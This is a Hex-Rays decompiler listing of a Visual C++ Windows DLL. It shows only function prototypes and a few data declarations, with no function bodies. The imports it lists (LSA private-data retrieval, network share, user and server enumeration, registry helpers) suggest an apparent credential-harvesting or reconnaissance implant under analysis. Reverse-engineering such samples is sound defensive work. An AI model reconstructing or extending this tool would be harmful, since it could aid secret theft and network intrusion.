/* This file was generated by the Hex-Rays decompiler version 7.7.0.220118.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
unsigned int RpcNsBindingInit();
// _DWORD *__thiscall unknown_libname_1(_DWORD *Block, char a2);
char __thiscall sub_100010FC(_DWORD *this);
_DWORD *__thiscall sub_100017B3(_DWORD *this, int a2);
void *__thiscall sub_100017BE(void *Block, char a2);
_DWORD *__thiscall sub_100017DA(_DWORD *this, int a2);
void *__thiscall sub_100017E5(void *Block, char a2);
char __stdcall sub_10001801(void *a1, size_t a2, size_t *a3);
void __thiscall __noreturn sub_100019F4(void *this);
_DWORD *__thiscall sub_10001A0F(_DWORD *this, int a2);
void *__thiscall sub_10001A1A(void *Block, char a2);
void __thiscall sub_10001A36(_DWORD *this);
void __thiscall sub_10001A65(_DWORD *this);
int __thiscall sub_10001A7D(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10001ADA(_DWORD *this, unsigned int a2);
int __thiscall sub_10001B1C(_DWORD *this, int a2);
int __thiscall sub_10001B3A(_DWORD *this, int a2);
void __thiscall sub_10001B58(_DWORD *this, unsigned int a2);
BOOL __thiscall sub_10001B7A(void *this);
unsigned int __thiscall sub_10001B85(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10001BF7(void *this, unsigned int pExceptionObject, int a3);
void __thiscall sub_10001C1E(_DWORD *this);
void __thiscall sub_10001C4D(_DWORD *this);
int __thiscall sub_10001C65(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10001CC2(int *this, int a2);
int __thiscall sub_10001CDC(_DWORD *this, unsigned int a2);
int __thiscall sub_10001D1E(_DWORD *this, int a2);
int __thiscall sub_10001D3C(_DWORD *this, int a2);
void **__thiscall sub_10001D5A(void **this, void **a2);
int __thiscall sub_10001D99(void **this);
unsigned int __thiscall sub_10001DB9(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10001E2B(_DWORD *this);
unsigned int __stdcall sub_10001E8B(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10001E9C(_DWORD *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_10001EF9(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10001F15(_DWORD *this, int a2);
_DWORD *__thiscall sub_10001F20(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10001F3C(_DWORD *Block, char a2);
void __thiscall sub_10001F58(_DWORD *this);
unsigned int __thiscall sub_1000201E(_DWORD *this, int a2);
void __thiscall sub_1000207A(_DWORD *this, int a2);
_DWORD *__thiscall sub_100021F6(_DWORD *this);
_DWORD *__thiscall sub_1000228F(_DWORD *Block, char a2);
void __cdecl sub_100022AB();
int __cdecl sub_100022D7(__int64 *a1);
char __cdecl sub_1000233F(void *a1);
int sub_10002538();
bool __cdecl sub_10002683(LPCSTR lpFileName);
LSTATUS __cdecl sub_10002698(HKEY hKey, LPCSTR lpSubKey);
LSTATUS __cdecl sub_100026CC(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, DWORD cbData, void *a6);
bool __cdecl sub_1000273E(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, int a5);
char __cdecl sub_10002790(LPCSTR lpString, _DWORD *a2);
char __stdcall sub_100028D5(void *Src, size_t Size, int a3);
char __cdecl sub_10002926(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, int a3);
_DWORD *__thiscall sub_10002AB9(_DWORD *this);
int __thiscall sub_10002AE7(void *this);
int sub_10002AEC();
char __thiscall sub_10002AF2(int this, void *a2, unsigned int a3);
DWORD __thiscall sub_10002B17(int this);
_DWORD *__thiscall sub_10002BAB(_DWORD *this);
int sub_10002BD9();
char __thiscall sub_10002BDF(int this, void *a2, unsigned int a3);
char __thiscall sub_10002C04(char *this);
int __thiscall sub_10002C4C(BYTE *this);
int __thiscall sub_10002D62(_DWORD *this, int a2);
_DWORD *__thiscall sub_10002D6C(_DWORD *this);
int sub_10002D94();
char __thiscall sub_10002D98(int this, void *a2, unsigned int a3);
_DWORD *__thiscall sub_10002DBA(_DWORD *this);
void __thiscall sub_10002DE9(_DWORD *this);
int __thiscall sub_10002E1A(_DWORD *this);
int __thiscall sub_10002E1E(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10002E7B(_DWORD *this, unsigned int a2);
int __thiscall sub_10002EBD(_DWORD *this, int a2);
int __thiscall sub_10002EDB(_DWORD *this, int a2);
void __thiscall sub_10002EF9(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10002F1B(_DWORD *this, unsigned int a2, int a3, int a4);
_DWORD *__thiscall sub_10002F8D(_DWORD *this);
void __thiscall sub_10002FBC(_DWORD *this);
int __thiscall sub_10002FED(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1000304A(_DWORD *this, unsigned int a2);
int __thiscall sub_1000308C(_DWORD *this, int a2);
int __thiscall sub_100030AA(_DWORD *this, int a2);
int __thiscall sub_100030C8(void **this);
unsigned int __thiscall sub_100030E8(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1000315A(_DWORD *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_100031B7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100031D3(_DWORD *Block, char a2);
unsigned int __thiscall sub_100031EF(_DWORD *this);
unsigned int __thiscall sub_10003284(_DWORD *this);
int __cdecl sub_100032F1(int a1);
_DWORD *__thiscall sub_10003308(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10003324(_DWORD *this, int a2);
int __thiscall sub_1000335C(_DWORD *this);
int sub_1000336B();
char __thiscall sub_1000336F(int this, void *a2, unsigned int a3);
void __thiscall sub_10003391(_DWORD *this);
_DWORD *__thiscall sub_10003487(_DWORD *this);
int sub_100034B0();
char __thiscall sub_100034B4(int this, void *a2, unsigned int a3);
LSTATUS __thiscall sub_100034D6(int this);
HKEY __thiscall sub_1000353F(_DWORD *this);
_DWORD *__thiscall sub_10003566(_DWORD *this, char a2);
int __thiscall sub_1000359E(_BYTE *this);
char __thiscall sub_100035AE(int this, void *a2, unsigned int a3);
LPSTR __thiscall sub_100035D0(int this, int a2);
DWORD __thiscall sub_1000363A(int this);
_DWORD *__thiscall sub_10003707(_DWORD *this);
_DWORD *__thiscall sub_10003743(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000375F(_DWORD *this, int a2);
HKEY __thiscall sub_1000376A(void *this);
HKEY __thiscall sub_100037B0(void *this);
int __thiscall sub_100037F6(_DWORD *this, int a2);
DWORD __thiscall sub_10003811(_DWORD *this, int a2);
_DWORD *__thiscall sub_1000381D(_DWORD *this);
int __thiscall sub_10003848(void *this);
int sub_1000384D();
char __thiscall sub_10003851(int this, void *a2, unsigned int a3);
char __thiscall sub_10003873(int this, int a2);
HKEY __thiscall sub_1000396B(void *this);
_DWORD *__thiscall sub_100039B1(_DWORD *this);
int sub_100039DF();
char __thiscall sub_100039E5(int this, void *a2, unsigned int a3);
char __stdcall sub_10003A0A(int *a1, int a2, int a3, const void *a4, wchar_t *Str, size_t *a6, int a7, void *a8, wchar_t *a9, void *a10);
int __thiscall sub_10003B37(_DWORD *this, int a2, int *a3);
char __stdcall sub_10003CF3(_DWORD *a1, _DWORD *a2, HMODULE *a3);
void __thiscall sub_10003D6F(_DWORD *this);
void __thiscall sub_10003DF8(_DWORD *this, int a2);
_DWORD *__thiscall sub_10003E73(_DWORD *this);
int sub_10003EA1();
char __thiscall sub_10003EA7(int this, void *a2, unsigned int a3);
int __thiscall sub_10003ECC(void *this, int a2);
char *__thiscall sub_10003EE7(char *this, int a2, int a3, char *Str, char *Source, char *a6);
char __thiscall sub_10003F90(BYTE *this, int a2);
char __thiscall sub_10003FFB(char *this, HKEY hKey);
LSTATUS __thiscall sub_100041F1(char *this, HKEY a2);
char __thiscall sub_10004476(int this, HKEY hKey);
char __thiscall sub_100044C3(_DWORD *this, HKEY a2);
LSTATUS __thiscall sub_100047BA(char *this, HKEY hKey);
char __thiscall sub_10004947(_DWORD *this, HKEY hKey);
LSTATUS __thiscall sub_10004D52(char *this, HKEY a2);
char __thiscall sub_10004FCE(int this, HKEY hKey);
char __thiscall sub_10005016(_DWORD *this, HKEY hKey);
char __thiscall sub_1000529D(_DWORD *this, HKEY hKey);
LSTATUS __thiscall sub_100054F9(int this, HKEY hKey);
LSTATUS __thiscall sub_1000553E(int this, int a2);
LSTATUS __thiscall sub_10005584(int this, int a2);
int __thiscall sub_100055CA(void *this, int a2);
int __thiscall sub_1000563D(char *this, int a2);
_DWORD *__thiscall sub_1000590B(_DWORD *this);
int sub_10005956();
char __thiscall sub_1000595C(int this, void *a2, unsigned int a3);
char __thiscall sub_10005981(int this);
char __thiscall sub_10005A4E(_DWORD *this, int a2);
_DWORD *__thiscall sub_10005A67(_DWORD *this);
int sub_10005A95();
char __thiscall sub_10005A9B(int this, void *a2, unsigned int a3);
void __thiscall sub_10005AC0(char *this);
char __thiscall sub_10005B2E(char *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_10005C3D(_DWORD *this, char a2);
int __thiscall sub_10005C7A(_BYTE *this);
char __thiscall sub_10005C8F(int this, void *a2, unsigned int a3);
void *__thiscall sub_10005CB7(_DWORD *this);
void *__stdcall sub_10005EFA(wchar_t *String, void *a2);
void *__thiscall sub_10005F45(void *this, void *a2, void *a3);
// HMODULE __usercall sub_1000606F@<eax>(char *a1@<ecx>, int a2@<esi>);
DWORD __thiscall sub_1000625A(int this, int a2);
DWORD __thiscall sub_10006377(int *this);
DWORD __thiscall sub_1000647E(CHAR *this);
char __thiscall sub_1000653D(void *this, HKEY hKey);
char __thiscall sub_10006750(char *this, int a2, HKEY hKey, const CHAR *a4, int a5, int a6);
char __thiscall sub_1000689F(char *this, HKEY hKey);
char __thiscall sub_10006DD4(char *this, HKEY hKey);
_DWORD *__thiscall sub_10006E4B(_DWORD *this);
int sub_10006E79();
char __thiscall sub_10006E7F(int this, void *a2, unsigned int a3);
int __stdcall sub_10006EA4(int a1);
void __stdcall sub_10006ECF(char *Str, DWORD *a2, char a3);
void __thiscall sub_100070CB(DWORD *this, int a2);
_DWORD *__thiscall sub_10007107(_DWORD *this);
int sub_1000712E();
char __thiscall sub_10007134(int this, void *a2, unsigned int a3);
DWORD __thiscall sub_10007159(_DWORD *this);
int __thiscall sub_10007314(_DWORD *this);
_DWORD *__thiscall sub_10007377(_DWORD *this);
int sub_100073A5();
char __thiscall sub_100073AB(int this, void *a2, unsigned int a3);
char __thiscall sub_100073D0(int this, HKEY hKey);
_DWORD *__thiscall sub_1000747A(_DWORD *this, char a2);
int __thiscall sub_100074B8(_BYTE *this);
char __thiscall sub_100074CD(int this, void *a2, unsigned int a3);
char __thiscall sub_100074F2(char *this);
DWORD __thiscall sub_1000799A(int this);
DWORD __thiscall sub_10007B5A(CHAR *this);
HMODULE __thiscall sub_10007D20(int this);
DWORD __thiscall sub_10007E63(const CHAR *this);
LSTATUS __thiscall sub_10007F8E(char *this);
int __stdcall sub_1000813F(int a1, _DWORD *a2, _DWORD *a3);
char __stdcall sub_1000818A(char *Buf1, _WORD *a2, _WORD *a3, int *a4);
char __stdcall sub_1000830F(char *Str);
DWORD __stdcall sub_10008385(wchar_t *a1, wchar_t *a2, _BYTE *a3, const WCHAR *a4, const CHAR *a5);
struct hostent *__stdcall sub_10008515(char *name);
void __stdcall sub_10008581(HMODULE hModule, int a2, void *a3);
unsigned int __thiscall sub_1000870D(CHAR *this, char a2);
bool __stdcall sub_10008981(char *a1, LPCSTR lpString2, LPBYTE lpData);
DWORD __stdcall sub_10008AC4(int a1, unsigned int a2, int a3, int a4, _DWORD *a5, HMODULE hModule, char a7);
DWORD __thiscall sub_10008E41(void *this);
DWORD __thiscall sub_10009116(int this, char a2);
DWORD __thiscall sub_10009322(wchar_t *this);
int __thiscall sub_10009450(void *this);
// BOOL __usercall sub_100094CA@<eax>(int a1@<ecx>, int a2@<ebp>);
_DWORD *__thiscall sub_100094DA(_DWORD *this);
int sub_10009508();
char __thiscall sub_1000950E(int this, void *a2, unsigned int a3);
void *__thiscall sub_10009533(int this);
void *__thiscall sub_100096B8(char *this, HKEY hKey);
void *__thiscall sub_100097DC(char *this, HKEY hKey);
_DWORD *__thiscall sub_100097F3(_DWORD *this, char a2);
int __thiscall sub_10009830(_BYTE *this);
char __thiscall sub_10009845(int this, void *a2, unsigned int a3);
int __thiscall sub_1000986D(_DWORD *this);
void *__thiscall sub_100098B8(void *this);
int __thiscall sub_100099F2(int this);
LPSTR __thiscall sub_10009A73(int this);
DWORD __thiscall sub_10009ADC(CHAR *this);
void __thiscall sub_10009B59(int this);
DWORD __thiscall sub_10009CC0(int *this);
unsigned __int8 __thiscall sub_10009DED(CHAR *this);
unsigned __int8 __thiscall sub_10009EF5(CHAR *this);
DWORD __thiscall sub_10009FDE(char *this);
DWORD __thiscall sub_1000A139(_DWORD *this);
int sub_1000A181();
char __thiscall sub_1000A187(int this, void *a2, unsigned int a3);
char __thiscall sub_1000A1AC(int this);
void __thiscall sub_1000A236(_DWORD *this);
unsigned int __thiscall sub_1000A267(_DWORD *this, const void *a2, unsigned int a3);
int __thiscall sub_1000A2D8(_DWORD *this, unsigned int a2);
int __thiscall sub_1000A354(_DWORD *this, int a2);
int __thiscall sub_1000A373(_DWORD *this, int a2);
unsigned int __thiscall sub_1000A392(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1000A40E(_DWORD *this);
unsigned int __thiscall sub_1000A492(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1000A508(_DWORD *this);
int __thiscall sub_1000A539(_DWORD *this, int a2);
int __thiscall sub_1000A555(_DWORD *this, int a2);
int __thiscall sub_1000A571(_DWORD *this, int a2);
void __thiscall sub_1000A587(_DWORD *this);
BOOL __thiscall sub_1000A5BC(void *Buf1, void *Buf2);
bool __thiscall sub_1000A5D3(void *Buf1, void *Buf2);
int __thiscall sub_1000A5EE(_DWORD *this);
int __thiscall sub_1000A602(_DWORD *this);
void __thiscall sub_1000A60A(_DWORD *this);
int __thiscall sub_1000A618(_DWORD *this);
int __thiscall sub_1000A620(_DWORD *this);
void __thiscall sub_1000A628(_DWORD *this);
unsigned int __thiscall sub_1000A659(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1000A6C8(_DWORD *this, unsigned int a2);
int __thiscall sub_1000A741(_DWORD *this, int a2);
int __thiscall sub_1000A760(_DWORD *this, int a2);
unsigned int __thiscall sub_1000A77F(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1000A7FB(_DWORD *this);
unsigned int __thiscall sub_1000A88F(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1000A904(_DWORD *this);
BOOL __thiscall sub_1000A939(void *Buf1, void *Buf2);
bool __thiscall sub_1000A950(void *Buf1, void *Buf2);
int __thiscall sub_1000A96B(_DWORD *this, int a2);
void __thiscall sub_1000A983(_DWORD *this);
BOOL __thiscall sub_1000A999(_DWORD *this, int a2);
int __thiscall sub_1000A9C3(_DWORD *this);
int __thiscall sub_1000A9CB(_DWORD *this, int a2);
_DWORD *__thiscall sub_1000A9E5(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AA01(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AA1D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AA39(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AA55(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AA71(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AA8D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000AAA9(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000AADF(_DWORD *this, void *Buf1);
_DWORD *__thiscall sub_1000AB65(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000AB9B(_DWORD *this);
int __thiscall sub_1000ABA3(_DWORD *this, void *Buf1);
_DWORD *__thiscall sub_1000AC29(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_1000AC62(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_1000AC8D(_DWORD *this, unsigned int a2);
void __thiscall sub_1000ACC6(_DWORD *this);
void __thiscall sub_1000AD18(char *this);
void __thiscall sub_1000AD95(char *this);
int __thiscall sub_1000AE15(_DWORD *this, _BYTE *a2, unsigned int a3);
int __thiscall sub_1000AE71(_DWORD *this, unsigned int a2);
void **__thiscall sub_1000AEB2(void **this, void **a2);
unsigned int __thiscall sub_1000AEF1(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1000AF64(_DWORD *this);
unsigned int __thiscall sub_1000AFCD(_DWORD *this, int a2, int a3, int a4);
bool __thiscall sub_1000B01C(_DWORD *this, void *Buf2);
char __thiscall sub_1000B059(_DWORD *this, void *Buf2);
int __thiscall sub_1000B0AB(_DWORD *this, void *Buf2);
int __thiscall sub_1000B10A(_DWORD *this, void *pExceptionObject);
_DWORD *__thiscall sub_1000B163(_DWORD *this, _DWORD *a2);
bool __thiscall sub_1000B17E(_DWORD *this, void *Buf2);
char __thiscall sub_1000B1BB(_DWORD *this, void *Buf2);
int __thiscall sub_1000B20D(_DWORD *this, void *Buf2);
int __thiscall sub_1000B26C(_DWORD *this, void *pExceptionObject);
_DWORD *__thiscall sub_1000B2C5(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000B2E0(_DWORD *this);
_DWORD *__thiscall sub_1000B2E8(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000B31E(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_1000B359(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_1000B394(_DWORD *Block, char a2);
char __thiscall sub_1000B3B0(_DWORD *this);
char __thiscall sub_1000B481(_DWORD *this);
char __thiscall sub_1000B548(_DWORD *this);
_DWORD *__thiscall sub_1000B622(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000B63D(_DWORD *this);
_DWORD *__thiscall sub_1000B654(_DWORD *this);
_DWORD *__thiscall sub_1000B66B(_DWORD *this);
void __thiscall sub_1000B711(char *this);
_DWORD *__thiscall sub_1000B745(_DWORD *this);
DWORD __thiscall sub_1000B770(_DWORD *this);
int sub_1000B794();
char __thiscall sub_1000B798(int this, void *a2, unsigned int a3);
int __cdecl sub_1000B7BA(_BYTE *a1, unsigned __int8 *a2, int a3, int a4);
int __cdecl sub_1000B8B0(int a1, int a2, int a3);
void __cdecl sub_1000B915(int a1, int a2, unsigned int a3);
int __cdecl sub_1000B96B(int a1);
unsigned int __cdecl sub_1000B970(int a1, unsigned int a2);
int sub_1000B992();
BOOL sub_1000B996();
int sub_1000BB05();
// BOOL __usercall sub_1000BB08@<eax>(_DWORD *a1@<eax>);
// unsigned int __usercall sub_1000BB20@<eax>(int a1@<eax>, unsigned __int8 *a2, _BYTE *a3, _DWORD *a4, int a5);
int __cdecl sub_1000BDFF(unsigned __int8 *a1, unsigned int a2, _BYTE *a3, _DWORD *a4, int a5);
int sub_1000BED3();
int __cdecl sub_1000C026(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
// unsigned int __usercall sub_1000C0A2@<eax>(int a1@<eax>);
void __cdecl sub_1000C0BC(int a1, unsigned int a2);
int __cdecl sub_1000C0E0(int a1);
// int __usercall sub_1000C10A@<eax>(_DWORD *a1@<esi>);
// int __usercall sub_1000C159@<eax>(BYTE *a1@<ebx>, _DWORD *a2@<edi>, HKEY hKey, const CHAR *lpSubKey, const CHAR *lpValueName);
// int __usercall sub_1000C1CB@<eax>(BYTE *a1@<ebx>, _DWORD *a2@<edi>);
// int __usercall sub_1000C1F1@<eax>(BYTE *a1@<eax>, _DWORD *a2@<ecx>);
int __cdecl sub_1000C251(BYTE Data); // idb
int __cdecl sub_1000C2FB(_DWORD *a1, BYTE *a2);
int __thiscall sub_1000C366(int *this);
char __thiscall sub_1000C378(_DWORD *this);
HKEY __thiscall sub_1000C47D(_DWORD *this);
// const char *__thiscall exception::what(exception *__hidden this); idb
int __cdecl sub_1000C4FA(int a1);
int __cdecl sub_1000C58C(int a1);
void sub_1000C656();
char sub_1000C6B6();
int sub_1000C6C6();
int __cdecl sub_1000C6FA(int a1, unsigned int a2, _DWORD *a3, const CHAR *a4);
// int __usercall sub_1000C8E9@<eax>(int a1@<esi>, int a2, unsigned int a3, LPCSTR lpMachineName);
int __cdecl sub_1000C9D8(_BYTE *a1);
int __cdecl sub_1000CA6D(_BYTE *a1, char *String2, _BYTE *a3);
int __cdecl sub_1000CAC3(int a1, int a2, _DWORD *a3);
HMODULE sub_1000CBCB();
int __cdecl sub_1000CC1A(_BYTE *a1, _BYTE *a2, int a3, int a4);
int __cdecl sub_1000CD04(_BYTE *a1);
int sub_1000CDF7();
// char __usercall sub_1000CF0C@<al>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, char *a4);
BOOL __cdecl sub_1000D1B5(DWORD dwProcessId, DWORD *pSessionId);
char __cdecl sub_1000D1CA(LPCSTR lpString1, _DWORD *a2, int a3, char a4);
char __cdecl sub_1000D2B2(LPCSTR lpString2);
int __cdecl sub_1000D3E6(int a1, int a2, int a3, unsigned int a4);
char __cdecl sub_1000D453(int a1, LPCSTR lpMachineName);
BOOL __cdecl sub_1000D697(LPVOID lpMem);
LPVOID __cdecl sub_1000D6AB(SIZE_T dwBytes);
_DWORD *__thiscall sub_1000D6BF(_DWORD *this);
void __thiscall sub_1000D6C8(_DWORD *this);
_DWORD *__thiscall sub_1000D6CF(_DWORD *this);
void __thiscall sub_1000D6DD(_DWORD *this);
_DWORD *__thiscall sub_1000D6E8(_DWORD *this);
void __thiscall sub_1000D6F6(_DWORD *this);
_DWORD *__thiscall sub_1000D701(_DWORD *this);
void __thiscall sub_1000D70F(_DWORD *this);
unsigned int __cdecl sub_1000D71A(unsigned int a1);
void sub_1000D728();
// int __cdecl SEH_10010F90(int, PVOID TargetFrame, int); idb
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
void __thiscall sub_1000DCB5(void *this);
// void *__cdecl memset(void *, int Val, size_t Size);
// void (__cdecl *__cdecl _set_se_translator(void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *)))(unsigned int, struct _EXCEPTION_POINTERS *); idb
void __thiscall sub_1000E059(struct type_info *this);
struct type_info *__thiscall sub_1000E067(struct type_info *Block, char a2);
void __cdecl j__free(void *Block);
void __thiscall sub_1000E0E6(void *this);
_DWORD *__thiscall sub_1000E0F1(_DWORD *Block, char a2);
std::exception *__thiscall sub_1000E113(std::exception *this, struct exception *a2);
// void *__cdecl operator new(size_t Size); idb
void sub_1000E612();
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
void __cdecl j_j__free(void *Block);
void *__cdecl operator new(size_t Size); // idb
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *)); idb
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, int, void (__thiscall *)(void *), void (__thiscall *)(void *)); idb
// char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
// char *__cdecl strncat(char *Destination, const char *Source, size_t Count);
// size_t __cdecl strlen(const char *Str);
// int _snprintf(char *const Buffer, const size_t BufferCount, const char *const Format, ...);
int __cdecl sub_1000EBB8(int a1, int a2);
// int __cdecl atexit(void (__cdecl *)());
// wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);
// wchar_t *__cdecl wcsncpy(wchar_t *Destination, const wchar_t *Source, size_t Count);
// size_t __cdecl wcslen(const wchar_t *String);
// char *__cdecl strstr(const char *Str, const char *SubStr);
// int __cdecl abs(int Number);
// void __cdecl free(void *Block);
// void *__cdecl malloc(size_t Size);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// wchar_t *__cdecl wcsncat(wchar_t *Destination, const wchar_t *Source, size_t Count);
// void __cdecl srand(unsigned int Seed);
// int __cdecl rand();
// int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount);
// __time64_t __cdecl _time64(__time64_t *Time);
// void __cdecl __noreturn __report_gsfailure();
// _DWORD __cdecl _encode_pointer(_DWORD); weak
// int _encoded_null(void); weak
// _DWORD __cdecl _decode_pointer(_DWORD); weak
int __cdecl sub_10011B15(_DWORD *a1);
int __cdecl sub_10011B4C(_DWORD *a1);
void *sub_10012528();
void __cdecl sub_1001254C(); // idb
// void __cdecl type_info::_Type_info_dtor(struct type_info *); idb
int __cdecl sub_10012C92(int a1);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct exception *); idb
void __thiscall sub_10012D5A(void *this);
void *__thiscall sub_10012D7D(void *Block, char a2);
int __cdecl sub_10012D99(int a1);
void __thiscall sub_10012DC5(void *this);
_DWORD *__thiscall sub_10012DD0(_DWORD *Block, char a2);
std::exception *__thiscall sub_10013953(std::exception *this, struct exception *a2);
// int __cdecl _output_l(int, int, struct localeinfo_struct *, int); idb
int __cdecl sub_10014631(int a1);
// void __cdecl __noreturn _invoke_watson(const wchar_t *Expression, const wchar_t *FunctionName, const wchar_t *FileName, unsigned int LineNo, uintptr_t Reserved);
// int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int *__cdecl _errno();
void **sub_100147DA();
// _DWORD __cdecl _lock_file2(_DWORD, _DWORD); weak
// _DWORD __cdecl _unlock_file2(_DWORD, _DWORD); weak
// int __cdecl _stbuf(FILE *Stream); idb
// int __cdecl _ftbuf(int, FILE *Stream); idb
// int _get_sse2_info(void); weak
int sub_1001664A();
void sub_10016657();
int sub_100166CB();
int __cdecl sub_10016888(int a1);
int __cdecl sub_10016892(int a1);
int __cdecl sub_10016D73(int a1, int a2, int a3);
// _DWORD __cdecl flsall(_DWORD); weak
int sub_10017D8F();
// DWORD __stdcall NetUseEnum(LPWSTR UncServerName, DWORD LevelFlags, LPBYTE *BufPtr, DWORD PreferedMaximumSize, LPDWORD EntriesRead, LPDWORD TotalEntries, LPDWORD ResumeHandle);
// DWORD __stdcall NetShareEnum(LPWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle);
// DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
// DWORD __stdcall NetUserGetLocalGroups(LPCWSTR servername, LPCWSTR username, DWORD level, DWORD flags, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries);
// DWORD __stdcall NetServerEnum(LPCWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, DWORD servertype, LPCWSTR domain, LPDWORD resume_handle);
// int __stdcall WSACleanup();
// struct hostent *__stdcall gethostbyname(const char *name);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// unsigned int __stdcall inet_addr(const char *cp);
// int __stdcall gethostname(char *name, int namelen);
// BOOL __stdcall EnumPrintersA(DWORD Flags, LPSTR Name, DWORD Level, LPBYTE pPrinterEnum, DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned);
// NTSTATUS __stdcall LsaFreeMemory(PVOID Buffer);
// NTSTATUS __stdcall LsaClose(LSA_HANDLE ObjectHandle);
// NTSTATUS __stdcall LsaRetrievePrivateData(LSA_HANDLE PolicyHandle, PLSA_UNICODE_STRING KeyName, PLSA_UNICODE_STRING *PrivateData);
// ULONG __stdcall LsaNtStatusToWinError(NTSTATUS Status);
// NTSTATUS __stdcall LsaOpenPolicy(PLSA_UNICODE_STRING SystemName, PLSA_OBJECT_ATTRIBUTES ObjectAttributes, ACCESS_MASK DesiredAccess, PLSA_HANDLE PolicyHandle);
FARPROC __stdcall sub_100195DF(int *a1, int *Arguments);
int sub_10019D88();
int sub_10019DA0();
int sub_10019DB8();
int sub_10019DD0();
int sub_10019DF2();
int sub_10019E14();
int sub_10019E2C();
int sub_10019E4E();
int sub_10019E64();
int sub_10019E7A();
int sub_10019EA3();
int sub_10019F15();
int sub_10019F3E();
const CHAR *sub_1001A019();
const CHAR *sub_1001A02A();
const CHAR *sub_1001A03B();
const CHAR *sub_1001A04C();
const CHAR *sub_1001A05D();
const CHAR *sub_1001A06E();
const CHAR *sub_1001A07F();
const CHAR *sub_1001A090();
const CHAR *sub_1001A0A1();
int sub_1001A0B2();
int sub_1001A0C3();
int sub_1001A0EC();
int sub_1001A115();
int sub_1001A13E();
const CHAR *sub_1001A167();
int sub_1001A178();
int sub_1001A189();
void __cdecl sub_1001A19A(); // idb
void __cdecl sub_1001A1A4(); // idb
void __cdecl sub_1001A1AE(); // idb

//-------------------------------------------------------------------------
// Data declarations

__int16 _ImageBase = 23117; // weak
__int16 word_10000002 = 144; // weak
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *MoveFileExW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
